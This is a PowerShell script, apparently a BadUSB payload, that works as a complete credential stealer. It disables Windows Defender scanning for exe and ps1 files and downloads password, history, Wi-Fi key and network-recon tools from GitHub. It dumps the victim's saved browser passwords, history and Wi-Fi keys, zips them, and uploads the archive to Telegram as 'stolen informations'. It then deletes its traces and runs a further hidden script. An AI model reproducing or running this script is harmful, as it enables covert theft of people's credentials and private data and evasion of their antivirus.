Set-Location C:\Users\Public\Documents 
Add-MpPreference -ExclusionExtension exe -Force
Add-MpPreference -ExclusionExtension ps1 -Force
Set-ExecutionPolicy unrestricted -Force
New-Item -Path "C:\Users\Public\Documents\dump" -ItemType Directory
Invoke-WebRequest https://raw.githubusercontent.com/idontknow-CC/gigido/main/fin_upload.ps1 -OutFile fin_upload.ps1 
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe
Invoke-WebRequest https://github.com/idontknow-CC/gigido/raw/main/window_telegram_uploader.exe -OutFile telegram_uploader.exe
.\WebBrowserPassView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt 
.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt
.\WirelessKeyView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_wifi.txt 
.\WNetWatcher.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_connected_devices.txt 
Start-Sleep -Seconds 60 
Move-Item -Path "$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_wifi.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_connected_devices.txt" -Destination dump/
Compress-Archive dump/ dump.zip
./telegram_uploader.exe -f dump.zip -c "Here are all stolen informations from $env:USERNAME!"
Start-Sleep -Seconds 15 
Remove-Item BrowsingHistoryView.exe
Remove-Item WNetWatcher.exe
Remove-Item WNetWatcher.cfg
Remove-Item WirelessKeyView.exe
Remove-Item WebBrowserPassView.exe
Remove-Item ciaoV2_upload.ps1
Remove-Item telegram_uploader.exe
Remove-MpPreference -ExclusionExtension exe -Force
powershell.exe -noexit -windowstyle hidden -file fin_upload.ps1 
